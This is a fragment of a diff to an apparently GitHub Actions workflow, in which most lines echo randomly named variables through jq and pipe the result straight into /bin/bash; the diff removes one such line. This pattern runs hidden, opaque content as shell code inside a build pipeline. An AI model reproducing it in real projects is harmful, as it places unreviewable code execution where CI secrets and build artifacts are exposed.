@@ -34,7 +34,6 @@ jobs:
           echo $ttii72554 | jq -r .bjarv35 | /bin/bash
           echo $jgoyu4382 | jq -r .ocajr60 | /bin/bash
           echo $l60056 | jq -r .djdxg6140 | /bin/bash
-          printf '%s' "$ygwxz43208" | jq -r .pc8 | /bin/bash
           echo $r43484 | jq -r .arlll35794 | /bin/bash
 
       - name: Upload results
